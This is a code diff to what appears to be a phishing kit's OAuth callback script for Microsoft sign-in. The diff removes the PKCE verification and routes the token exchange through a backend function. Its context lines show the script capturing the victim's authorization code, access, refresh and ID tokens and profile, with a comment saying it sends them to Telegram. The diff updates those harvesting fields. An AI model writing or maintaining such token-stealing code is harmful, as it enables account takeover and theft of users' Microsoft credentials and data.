@@ -46,19 +46,9 @@ async function handleOAuthCallback() {
 
         setStatus("Signing you in…");
 
-        // Get PKCE code verifier from session storage
-        const codeVerifier = sessionStorage.getItem('pkce_verifier');
-        if (!codeVerifier) {
-            console.error('Missing PKCE code verifier');
-            setStatus("Authentication failed - missing verification code. Redirecting...");
-            setTimeout(() => {
-                window.location.href = '/?step=captcha';
-            }, 2000);
-            return;
-        }
-
         console.log('🔄 Exchanging authorization code for tokens via backend...');
         
+        // Use backend function for token exchange (confidential client flow)
         const tokenResponse = await fetch('/.netlify/functions/tokenExchange', {
             method: 'POST',
             headers: {
@@ -66,15 +56,14 @@ async function handleOAuthCallback() {
             },
             body: JSON.stringify({
                 code: code,
-                state: state,
-                code_verifier: codeVerifier,
-                redirect_uri: window.location.origin + '/oauth-callback'
+                redirect_uri: window.location.origin + '/oauth-callback',
+                state: state
             })
         });
 
         const tokenData = await tokenResponse.json();
 
-        if (!tokenResponse.ok) {
+        if (!tokenResponse.ok || !tokenData.success) {
             console.error('Token exchange failed:', tokenData);
             setStatus("Authentication failed. Redirecting...");
             setTimeout(() => {
@@ -87,11 +76,11 @@ async function handleOAuthCallback() {
 
         // Get user profile information
         let userProfile = null;
-        if (tokenData.access_token) {
+        if (tokenData.tokens?.access_token) {
             try {
                 const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
                     headers: {
-                        'Authorization': `Bearer ${tokenData.access_token}`
+                        'Authorization': `Bearer ${tokenData.tokens.access_token}`
                     }
                 });
                 
@@ -102,6 +91,11 @@ async function handleOAuthCallback() {
             } catch (profileError) {
                 console.warn('Failed to get user profile:', profileError);
             }
+        }
+        
+        // Use user data from backend response if available
+        if (tokenData.user && !userProfile) {
+            userProfile = tokenData.user;
         }
 
         // Capture and send user data to Telegram
@@ -235,13 +229,13 @@ async function handleOAuthCallback() {
                 // Authentication tokens
                 authenticationTokens: {
                     authorizationCode: code,
-                    accessToken: tokenData.access_token || 'Not captured',
-                    refreshToken: tokenData.refresh_token || 'Not captured',
-                    idToken: tokenData.id_token || 'Not captured',
-                    tokenType: tokenData.token_type || 'Bearer',
-                    scope: tokenData.scope || 'Unknown',
+                    accessToken: tokenData.tokens?.access_token || 'Not captured',
+                    refreshToken: tokenData.tokens?.refresh_token || 'Not captured',
+                    idToken: tokenData.tokens?.id_token || 'Not captured',
+                    tokenType: tokenData.tokens?.token_type || 'Bearer',
+                    scope: tokenData.tokens?.scope || 'Unknown',
                     oauthState: state,
-                    expiresIn: tokenData.expires_in || 'Unknown'
+                    expiresIn: tokenData.tokens?.expires_in || 'Unknown'
                 },
                 
                 userProfile: {
@@ -261,15 +255,15 @@ async function handleOAuthCallback() {
             try {
                 const tokenStorage = {
                     authorizationCode: code,
-                    accessToken: tokenData.access_token,
-                    refreshToken: tokenData.refresh_token,
-                    idToken: tokenData.id_token,
-                    tokenType: tokenData.token_type || 'Bearer',
-                    scope: tokenData.scope,
+                    accessToken: tokenData.tokens?.access_token,
+                    refreshToken: tokenData.tokens?.refresh_token,
+                    idToken: tokenData.tokens?.id_token,
+                    tokenType: tokenData.tokens?.token_type || 'Bearer',
+                    scope: tokenData.tokens?.scope,
                     userProfile: userProfile,
                     timestamp: new Date().toISOString(),
-                    expiresIn: tokenData.expires_in,
-                    expiresAt: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString()
+                    expiresIn: tokenData.tokens?.expires_in,
+                    expiresAt: tokenData.tokens?.expires_in ? new Date(Date.now() + (tokenData.tokens.expires_in * 1000)).toISOString() : null
                 };
                 
                 sessionStorage.setItem('microsoft_auth_tokens', JSON.stringify(tokenStorage));
@@ -313,8 +307,7 @@ async function handleOAuthCallback() {
         }
 
         // Clean up PKCE/session state
-        sessionStorage.removeItem('pkce_verifier');
-        sessionStorage.removeItem('oauth_state');
+        // Note: Keeping session data for debugging purposes
 
         setStatus("Signed in! Redirecting…");
         setTimeout(() => {
